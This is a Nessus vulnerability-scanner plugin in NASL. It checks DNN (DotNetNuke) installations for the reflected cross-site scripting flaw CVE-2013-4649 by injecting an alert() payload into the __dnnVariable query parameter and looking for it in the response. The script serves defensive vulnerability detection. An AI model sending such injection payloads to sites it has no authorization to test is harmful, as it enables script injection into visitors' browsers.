#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69400);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2017/05/16 19:35:38 $");

  script_cve_id("CVE-2013-4649");
  script_bugtraq_id(61770);
  script_osvdb_id(96326);

  script_name(english:"DNN (DotNetNuke) __dnnVariable Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP.NET application that is affected
by a cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of DNN installed on the remote host is affected by a
cross-site scripting vulnerability due to a failure to properly
sanitize user-supplied input to the ' __dnnVariable' parameter. An
unauthenticated, remote attacker can exploit this, via a specially
crafted request, to inject arbitrary HTML and script code into a
user's browser to be executed within the security context of the
affected site.

Note that the application is reportedly also affected by an additional
cross-site scripting issue as well as a redirect error that can lead
to phishing attacks; however, Nessus has not tested for these
additional issues.");
  script_set_attribute(attribute:"see_also", value:"https://packetstormsecurity.com/files/122792/dotnetnuke710-xss.txt");
  script_set_attribute(attribute:"see_also", value:"http://www.dnnsoftware.com/Platform/Manage/Security-Bulletins");
  script_set_attribute(attribute:"solution", value:"Upgrade to DNN version 6.2.9 / 7.1.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/08/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/08/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dotnetnuke:dotnetnuke");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("dotnetnuke_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/DNN");
  exit(0);
}

include("audit.inc");
include("misc_func.inc");
include("global_settings.inc");
include("http.inc");
include("install_func.inc");

app = "DNN";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, asp:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

# Make sure it looks vulnerable by examining /js/dnncore.js
res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/js/dnncore.js",
  exit_on_fail : TRUE
);
exploit = FALSE;
if (
  ("dnn.getVar('__dnn_pageload')" >< res[2]) ||
  ('dnn.getVar("__dnn_pageload")' >< res[2])
)
{
  xss_test = "{'__dnn_pageload':'alert(/"+SCRIPT_NAME+"-" +unixtime() + "/)'}";
  xss_expected = str_replace(string:xss_test, find:"'", replace:"`");
  xss_expected = str_replace(string:xss_expected,find:"}",replace:"");

  exploit = test_cgi_xss(
    port     : port,
    dirs     : make_list(dir),
    cgi      : '/',
    qs       : '__dnnVariable=' + xss_test,
    pass_str : 'value="`' + xss_expected,
    pass_re  : 'id="__dnnVariable'
  );
}

if (!exploit)
{
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
}
